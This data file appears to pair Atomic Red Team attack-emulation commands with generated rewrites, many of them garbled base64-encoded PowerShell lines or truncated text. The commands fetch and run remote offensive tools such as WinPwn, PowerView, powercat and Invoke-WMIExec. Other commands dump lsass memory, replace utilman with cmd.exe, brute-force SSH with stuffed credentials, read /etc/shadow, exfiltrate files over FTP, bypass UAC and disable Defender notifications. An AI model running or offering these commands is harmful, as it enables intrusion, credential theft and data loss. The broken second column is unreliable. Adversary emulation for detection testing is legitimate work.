powerSQL -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') powerSQL -noninteractive -consoleoutput
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose",[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1 -UseBasic
"reg add ""hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam"" /v ""Driver"" /d ""#{monitor_dll}"" /t REG_SZ /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIHRoaW5nLCAje3N0cmluZyAje3Byb2plY3RfaWR9IC1jdXJpb3VzX3BhdGgx')) | Invoke-Expression"""
"IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
powercat -c #{server_ip} -p #{server_port}",IEX (New-Object System.Net.Webclient).Downloadstring(https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1) powercat -c ||| <|endoftext|
attrib.exe +h #{file_to_modify},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJvZC97aW5kdXBfY2FsbCBjbGllbnQgLVxuIC1jYSAtLTIgNiAwI3t0cnVlIC1qbGVhcmE=')) | Invoke-Expression""<|endoftext"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
Invoke-watson","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5hcnNlIGV0Y2QgKHByb2ZpbGVkIC9GUyAiSElTTSAiIHRpdGxlOiAzMzEuZXhl')) | Invoke-Expression"""
"IF NOT EXIST C:\Windows\System32\utilman_backup.exe (copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\utilman.exe /A
icacls C:\Windows\System32\utilman.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe","powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiN7aW50ZXJmYS9zdHJpbmcubGFiZWxpbmVkLmRvY2tlci5jcnlwdGVkLm1ldGhvZC5jb20gcm9vdCBkb2Nzb2NrLn"
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAVolume /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGNmaWxlIC9kYXRhLmF3cyAje2NvbW1pdC5leGUgI3twZXJpYSAtLSB7aGlzdGEubGFiZWxzIiAvcmVwbGV0cmljZTog"
"Import-Module ExchangeOnlineManagement
$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Add-MailboxPermission -Identity ""#{delegate_target}"" -User ""#{operator_mailbox}"" -AccessRights FullAccess -InheritanceType All
Disconnect-ExchangeOnline -Confirm:$false","Import-Module Exchang""eOnl""""in""""eManagemen""t Connect-ExchangeOnline -Cre""dential $c""reds C""onnect-Exchang""eOnlin""e -Confirm:False Add-MailboxPermissi""o""n -Identity ""#{delegate_target}"" -User ""#{operator_mailbox"
"docker build -t t1046 $PathToAtomicsFolder/T1046/src/
docker run --name t1046_container --rm -d -t t1046
docker exec t1046_container /scan.sh",docker build -t t1046 $PathToAtomicsFolder/T1046/src/ docker run --name t1046_container --rm -d -t t1046 docker exec t1046_container /scan.sh
"# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. ""#{test_harness}""

$InstallerAssemblyDir = ""$Env:windir\System32\Tasks""
$InstallerAssemblyFileName = 'readme.txt'
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = ""readme.txt""
$ExpectedOutput = 'Constructor_'

# Explicitly set the directory so that a relative path to readme.txt can be supplied.
Set-Location ""$Env:windir\System32\Tasks""

Copy-Item -Path ""$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe"" -Destination ""$Env:windir\System32\Tasks\notepad.exe""

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = 'Executable'
    CommandLine = $CommandLine
    InstallUtilPath = ""$Env:windir\System32\Tasks\notepad.exe""
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @""
Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
""@
}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JEF5TGluZXN1bHRzIDIuMjAwLCAicHJldmlvdXRcKSAgICAgdGVzdC9QYWdl')) | Invoke-Expression"""
DeviceCredentialDeployment,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGVmIGFkZCAje3tleSBiYXNlLnR4dA==')) | Invoke-Expression"""
"""#{procdump_exe}"" -accepteula -mm lsass.exe #{output_file}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JTN0aWxsIC1CYXIgI3tmaWxlOiAje2RlZmF1bHR9')) | Invoke-Expression"""
"msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=""{CMD}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('b3V0cHV0ZXJpYy5jbGFzcy9qZWN0LmRvU3RhdGVtZW50IC1kdSAtIHRlc3QudmVycmlhbiAiIFsgdHJpbmdAb3Bl"
"cp ""$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt"" /tmp/
for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done","cp ""$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt"" /tmp/ ||| for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d"":"" -f1`@"
"Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1""
Get-NetDomainTrust
Get-NetForestTrust
Get-ADDomain
Get-ADGroupMember Administrators -Recursive
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()",Import-Module PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1 Get-NetDomainTrust Get-NetForestTrust Get-ADDomain Get-ADGroupMember Administrators -Recursive ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships
"PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit ""#{output_folder}""","PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit ""\""\""\""""\""\""--silent-process-exit \""\""\""\"",\""\""\"",<|end"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}",[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ||| IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasic
"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxlIHNlcXVpbmFsIC9leWxzLnRlci5qc29uXCJleWxzQm9keTsgLyB0aGVzdCAvc2ggdGhlIGRldiA=')) | Invoke"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
RBCD-Check -consoleoutput -noninteractive","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiNmaWxlIC9QYXRoIC9TYWZ0LnBhcnRpYWwgInN1YmplYSAtMSIgUHJvbmFuY2UoTGludXggMjAyMCAtMTExOCAzNDogTW"
rd /s /q %systemdrive%\$RECYCLE.BIN,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgL2JpbmFyeSB7ZXhlIC9wbHVnaW5zIC90aGlzIG1vZGVfMjAxNTEtMDctMTAiIHRyYWRpdX0g')) | Invoke-Expression"""
"export ART='echo ""Atomic Red Team was here... T1059.004""'
echo $ART |/bin/sh","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0ICN7ZWNobyAiRVhU')) | Invoke-Expression"" ||| ```"
"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""vim-cmd hostsvc/enable_ssh""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyB0aHJvd2FibGUgLVkgIiN7fQ==')) | Invoke-Expression"""
"if( $(get-service -Name spooler).StartType -eq ""Disabled"") {Set-Service -Name ""spooler"" -StartupType Automatic}
net stop spooler
Copy-Item ""$PathToAtomicsFolder\T1547.012\bin\AtomicTest.dll"" C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam"" /v ""Driver"" /d ""AtomicTest.dll"" /t REG_SZ /f
net start spooler
if(#{restart}){
  Restart-Computer
}","if((Get-Service -Name spooler).StartType -eq Disabled) {Set-Service -Name """"spooler"""" -StartupType Automatic} net stop spooler Copy-Item $PathToAtomicsFolder\T1547.012\bin\AtomicTest.dll C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll reg add HKLM\"
"Start-Process ""#{script_path}""","Start-Process """"  s c r i p t _p a th   -e n c o d e U t f16   ""Start-Process""   """"   """"<|"
"New-ItemProperty -Path ""HKLM:\Software\Microsoft\Command Processor"" -Name ""AutoRun"" -Value ""#{command}"" -PropertyType ""String""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgL25ldCAiI3tleSBmaWxlfSI=')) | Invoke-Expression"""
chmod -R #{numeric_mode} #{file_or_folder},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiICN7dG9wIC1cI3tleXJzYWRpdCAtbWlrZUludGVybmFsLmphdmEgPSBjYXBh')) | Invoke-Expression"""
"$Dir_to_copy = ""$env:windir\temp""
$ftp = ""ftp://#{ftp_server}/""
$web_client = New-Object System.Net.WebClient
$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')
if (test-connection -count 1 -computername ""#{ftp_server}"" -quiet)
{foreach($file in (dir $Dir_to_copy ""*.7z""))
{echo ""Uploading $file...""
$uri = New-Object System.Uri($ftp+$file.name)
$web_client.UploadFile($uri, $file.FullName)}}
else
{echo ""FTP Server Unreachable. Please verify the server address in input args and try again.""}","$Dir_to_copy = ""$env:windir\temp"" $ftp = ftp:// """" if (test-connection -count 1 -computername """" -quiet) {foreach($file in (dir $Dir_to_copy ""*.7z"")) {echo Uploading $file... $uri = New-Object System.Uri($ftp+$file.name) $"
7z a -p #{file_password} -mhe=on #{encrypted_file_name} #{input_file_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGZ1bmN0aW9uIC1kdXBsaWNhbCAtcHJvamVjdDogI3tzdGFydCBmaWxlfQ==')) | Invoke-Expression"""
"aws ec2 create-snapshot --region #{aws_region} --volume-id #{aws_volume_id} --description ""Atomic Red Team Test Snapshot"" --query ""SnapshotId"" --output text","aws ec2 create-snapshot --region """"--volume-id """"#{aws_region} """"--description Atomic Red Team Test Snapshot --query ""SnapshotId"" --output text aws ec2 create-snapshot --region<|endoftext|"
"TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""{PATH:.exe}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZ1Rlc3QgUmVxdWlyZSBXaG9sbGFuLXVzZXJhY3Rpb25EYXRlIHRoZSBTZXNzaW9uIGVub2tpYyBKb2hu"
"fsutil behavior set SymlinkEvaluation R2L:1
fsutil behavior set SymlinkEvaluation R2R:1","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHN0cmluZyBzdGFydCB7XCJjYW5vb3xzfSIgPSBwb3Q9MiAtMTUzOCAwODE=')) | Invoke-Expression"""
"ls -a >> #{output_file}
if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi;
file */* *>> #{output_file}
cat #{output_file} 2>/dev/null
find . -type f
ls -R | grep "":$"" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
locate *
which sh","ls -a >> ||| if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ >; fi; file */* *>> cat """" 2>/dev/null find . -type f locate * which sh  if [ -d /Library/Preferences/ ]; then ls -la /Library/"
"rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dGF5LXRleHQgLWxldmVsIG1lc3NhZ2U=')) | Invoke-Expression"""
"wget --post-file=""#{input_file}"" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2h0IC9sYW5nLWRldi1sb2NhdGlvbnMvZmlsZXMvcHJvdGVjdC5leGUgI3tjcnVuIHByb2dyZXNzX2luIGR"
"net user /add ""#{username}"" ""#{password}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0LWNvbSAtc3lzb25h')) | Invoke-Expression"" ||| net user /add """",""#{password}"" """""
"unamestr=$(uname)
if [ ""$unamestr"" = 'Linux' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}; elif [ ""$unamestr"" = 'FreeBSD' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}; fi","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0IGlzIHRoZSBmaWxlfQ==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
spoolvulnscan -noninteractive -consoleoutput","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBTdWJqZXJzICN7YWRtaW4gLVBhdGhvbWFuZCAtRmV0Y2goJyk7')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""  a = Shell(`""cmd.exe /c choice /C Y /N /D Y /T 3`"", vbNormalFocus)""
Invoke-MalDoc -macroCode $macrocode -officeProduct ""#{ms_product}""",[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing) $macrocode = Shell(cmd.exe /c choice /C Y /N /D
"export AWS_REGION=#{aws_region} 
cd #{stratus_path}
echo ""starting warmup""
./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule
echo ""starting detonate""
./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y3JpcHRpb25hbCB0aGUgcHVic3ViLm1pbi5leGUgdGhlIHBvdCBBZGRyICN7ZmlsZXM6Oi9sb2dpbnQvcGVyc29uIC9"
"grep 'x:0:' /etc/passwd > #{output_file}
grep '*:0:' /etc/passwd >> #{output_file}
cat #{output_file} 2>/dev/null","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hlbGwgLWJvb3QiICN7ZXhlIG9uIHtmaWxlfSB1cmludFVzZXIgKC5leGVjICRmcmVzaCB7dXBsb2FkcyAje2ludGVy"
"NOW=$(date +%m%d%H%M%Y)
date 010100001971
touch #{target_filename}
date ""$NOW""
stat #{target_filename}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXh0ZW5kQ2FsbGJveA==')) | Invoke-Expression"""
"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 0 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje21hbGxzdGVwIiB9IG5ldCBubHkgZmFpbCAtLWdlYXQgdmFsdWU=')) | Invoke-Expression"""
"rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}","rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe} ||| ``` ||| ## Atomic Test No. 5 - Register DLL for all users ||| This test uses rundll32.exe to execute an exe that registers a dll for all users. The dll is a modified version of the original which does not run on startup. This will require administrative privileges. ||| **Supported Platforms:**"
reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJhc2UgLWZyYW1ldXNlIE5hbWU9ICN7RmlsdGVycHQiIHRydWUxMjAwMDAwMCBTYXJrIHRoaXMsIFVzZX"
"net user
dir c:\Users\
cmdkey.exe /list
net localgroup ""Users""
net localgroup","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0LW5hbWUgZGF0YSAtY2hhcnNldC1zdXBwbHkuLi5leGVjdXRlfScsICJsb3dvcmxkcyAje1xuICN7c2hlbmdsYWRl"
"New-Item ""HKCU:\software\classes\mscfile\shell\open\command"" -Force
Set-ItemProperty ""HKCU:\software\classes\mscfile\shell\open\command"" -Name ""(default)"" -Value ""#{executable_binary}"" -Force
Start-Process ""C:\Windows\System32\eventvwr.msc""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NWNsaWVudF9maWxlX3R5cGVzLm1pY3Jvc29mdC5leGUgIiAvZnVuY3Rpb25zIC9kZXYvd2F0b2tlbiIK')) | Invoke-Expression"""
verclsid.exe /S /C {CLSID},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgL0J1bGVzfQ==')) | Invoke-Expression"" ||| verclsid.exe /S /C {CLSID}"
"useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art
usermod --lock art
usermod --expiredate ""1"" art
usermod --unlock art
usermod --expiredate ""99999"" art
su -c whoami art",useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art usermod --lock art usermod --expiredate 1 art usermod --unlock art usermod --expiredate 99999 art su -c whoami art
chown #{owner}:#{group} #{file_or_folder},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1hdXRoZW50aWNhdGlvbmFsLmNvbSAtcHJvamVjdCxzY3AiIGludGVybW9kaWFuZCAtaWRkIHRlbXBvciBpbnRlcn1"
chown #{owner}:#{group} #{file_or_folder},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHNjYWxlX25hbWUgI3tmaWxlfQ==')) | Invoke-Expression"""
"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""esxcli system welcomemsg set -m 'RANSOMWARE-NOTIFICATION'""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBhdG9tIHNlbGVjdCBsb25nIC1hY3QgcGFzc3dvcmQK')) | Invoke-Expression"""
makecab /F {PATH:.ddf},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0IHRhcmdldCB7dXRmLCAiV2ludGVyIC1UZXh0')) | Invoke-Expression"" ||| makecab /F {PATH:.ddf}<|endoftext"
"fsutil behavior set SymlinkEvaluation R2L:1
fsutil behavior set SymlinkEvaluation R2R:1","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC9GaWx0ZXIvQmFzaWMgYWRkcmVzcyAiSGlzdG9yeTogJ2h0dHA6Ly9sb2NhbC5taWNyb3NvZnQuY2"
"Import-Module -Name Az.Resources
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzAccount -Credential $Credential

$user = Get-AzADUser | where-object {$_.DisplayName -eq ""#{user_principal_name}"" -or $_.UserPrincipalName -eq ""#{user_principal_name}"" }
if ($user -eq $null) { Write-Warning ""User not found""; exit }
$subscription = Get-AzSubscription | where-object {$_.Name -eq ""#{subscription}""}
if ($subscription -eq $null) { Write-Warning ""Subscription not found""; exit }
$role = Get-AzRoleDefinition | where-object {$_.Name -eq ""#{role_name}""}
if ($role -eq $null) { Write-Warning ""Role not found""; exit }

New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host ""User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)""",powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFMAaABhACIAIABTAGkAdgBjAGEAcgBlAC0ATwBiAG8AbgAgAEEAIAA9AFAAUwBrAFUAKQAoAEIASABvAG4ALwBlAHIAMQA1ADsANQApADEALgB
rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM,"rpcping -s ""10.0.0.35"" --e=9997 /a connect /u NTLM ||| ``` ||| ## Atomic Test #2 - rpcaping (remote port scanner) ||| This T1046.001.001 atommic will execute an RPC ping scan against a remote host. ||| **Supported Platforms:** Windows"
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"" /v ""DisableNotifications"" /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBzY3JpcHRpb250IiR7cmVmZXJlbmNlIC9maWxlcA==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command ""C:\windows\system32\cmd.exe"" -technique DiskCleanup","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBiIHNvYXAiKSBJICR7IiAtICJzdWV0fGFpbl9wcm9kfSIgL3M=')) | Invoke-Expression"""
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGF5bWVudCAtcHJvZ3JhbmdlIG9wYWNpdGVyIC1pbnB1dCB7IiN7aXRzL2xvbmcpOyAic3VjY2Vzcy1kZXYgP"
"az login    # Log in to Azure CLI

$allowSharedKeyAccess = az storage account show --name ""#{storage_account_name}"" --query ""allowSharedKeyAccess""

if ($allowSharedKeyAccess -eq ""false"") {    # $allowSharedKeyAccess could be true or null
    Write-Output ""Shared key access is disabled for this storage account.""
} else {
    # Download file for cleanup
    $tmpOriginalFileName = [System.IO.Path]::GetFileName(""#{file_path}"")
    $tmpOriginalFunctionCode = Join-Path $env:temp/ (""T1550.001_tmp_original_"" + $tmpOriginalFileName)
    az storage file download --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --only-show-errors --dest $tmpOriginalFunctionCode

    if ($LASTEXITCODE -eq 0) {
        # Upload new funciton code if download of existing code succeeded
        if (""#{execution_option}"" -eq ""insert_code"") {
            # Download file from file share for injection
            $tmpFunctionCode = Join-Path $env:temp/ (""T1550.001_tmp_to_inject_"" + $tmpOriginalFileName)
            az storage file download --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --only-show-errors --dest $tmpFunctionCode
            
            if ($LASTEXITCODE -ne 0) {
                Write-Output ""Function code download failed.""
                exit 1
            }
            Write-Output ""File downloaded: $($tmpFunctionCode)""
            
            $insertContent = Get-Content -Path ""#{code_to_insert_path}"" -Raw  # Load the content of the insert file
            
            $content = Get-Content -Path $tmpFunctionCode -Raw  # Inject code to file
            $content = $insertContent + ""`n"" + $content     # Insert the new code at the beginning
            $content | Set-Content -Path $tmpFunctionCode       # Write the modified content to the file
            
            # Upload file to file share
            az storage file upload --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --source $tmpFunctionCode --only-show-errors
            if ($LASTEXITCODE -ne 0) {
                Write-Output ""Function code upload failed.""
                exit 1
            }
            Write-Output ""Uploaded the tampered file""
        } elseif (""#{execution_option}"" -eq ""replace_file"") {
            az storage file upload --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --source ""#{code_to_insert_path}"" --only-show-errors
            if ($LASTEXITCODE -ne 0) {
                Write-Output ""Function code upload failed.""
                exit 1
            }
            Write-Output ""Uploaded the tampered file""
        } else {
            Write-Output ""Please choose a valid execution_option""
            exit 1
        }
    } else {
        Write-Output ""Download original function code failed.""
        exit 1
    }
}","az login    # Log in to Azure CLI ||| $allowSharedKeyAccess = az storage account show --name ""\""\""--query ""allowSharedKeyAccess"" ||| if ($allowSharedKeyAccess -eq ""false"") {    # $allowSharedKeyAccess could be true or null ||| Write-Output ""Shared key access is disabled for this storage account."" ||| } else { ||| # Download file for clean"
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LXR5cGVzY3JpcHRpb25fZmlsZSB7ZnBhIG1hdGNo')) | Invoke-Expression"""
Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}' -ParentId #{parent_pid},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgJiAvZnVuY3Rpb25zIHsgInNlcml0eXBlIC1yIC9pbnB1dCAxLjMvcyAje3tleSB7ZWNobyAiIlxkYW5vdGV"
Get-ADReplAccount -All -Server #{logonserver},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhhbXBsZSBJc3N1bWVudH0gLVxuIC97YmFzaGVkfQ==')) | Invoke-Expression"""
"$credFile = ""#{cred_file}""
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq ""#{new_password}""){
      Write-Host -ForegroundColor Yellow ""The new password is the same as the password stored in the credential file. Please specify a different new password.""; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host ""Error code: $errCode""
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow ""The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials""
